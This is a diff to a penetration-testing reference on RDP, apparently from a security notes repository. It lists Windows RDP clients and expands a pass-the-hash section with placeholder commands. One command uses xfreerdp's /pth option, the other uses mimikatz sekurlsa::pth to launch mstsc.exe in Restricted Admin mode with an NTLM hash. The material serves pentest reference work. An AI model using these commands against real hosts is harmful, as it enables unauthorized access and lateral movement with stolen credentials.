@@ -146,13 +146,14 @@ code execution is available.
 
 ###### Windows
 
-On Windows, the default `Microsoft Remote Desktop` application
-("Connexion Bureau à distance") or the `Remote Desktop Manager` third party
-application can be used as `RDP` clients.
+On Windows, the default `Microsoft Remote Desktop` (`mstsc.exe`) application
+("Connexion Bureau à distance") or the `Remote Desktop Manager` and `mRemoteNG`
+third parties applications can be used as `RDP` clients.
 
-The `Remote Desktop Manager` allows for the configuration and storing of
-multiples `RDP` connection (host and authentication information). A free
-edition is available as well as a commercial grade enterprise edition.
+The `Remote Desktop Manager` and `mRemoteNG` clients allow for the
+configuration and storing of multiples `RDP` connections (host and
+authentication information). A free edition of `Remote Desktop Manager` is
+available as well as a commercial grade enterprise edition.
 
 ###### Linux
 
@@ -174,11 +175,18 @@ Remmina
 
 ### Pass-the-hash over RDP
 
-`FreeRDP` can be used to authenticate using the hash through RDP against hosts
-using the `Restricted Admin mode` feature.
+The `xfreerdp` client on Linux and `mimikatz` with the built-in `mstsc.exe`
+client on Windows can be used to authenticate using an account's `NTLM` hash
+through `RDP`. The remote hosts must support the `Restricted Admin mode`
+feature.
 
 ```
+# Linux.
 xfreerdp /u:'<DOMAIN | WORKGROUP>\<USERNAME>' /pth:<HASH> /v:<HOSTNAME | IP>
+
+# Windows.
+# The Remote Desktop Connection (mstsc.exe) client will display the currently logged user information but the network connection will be established using the identity specified to mimikatz's sekurlsa::pth.  
+sekurlsa::pth /domain:<. | DOMAIN_FQDN> /user:<USERNAME> /ntlm:<NT_HASH> /run:"mstsc.exe /restrictedadmin"
 ```
 
 ### Man-in-the-middle attack
